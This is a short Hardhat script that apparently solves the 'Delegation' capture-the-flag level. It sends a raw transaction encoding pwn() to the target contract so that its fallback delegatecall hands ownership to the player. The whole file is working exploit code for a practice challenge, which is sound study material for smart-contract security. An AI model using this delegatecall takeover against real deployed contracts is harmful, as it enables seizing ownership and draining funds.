import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x532B02BD614Fd18aEE45603d02866cFb77575CB3";
const PLAYER_ADDRESS = "0x976EA74026E726554dB657fA54763abd0C3a0aa9";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Delegation", CONTRACT_ADDRESS, signer);

    const iface = new ethers.utils.Interface(["function pwn()"]);
    const data = iface.encodeFunctionData("pwn");

    await signer.sendTransaction({ data, to: contract.address });
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
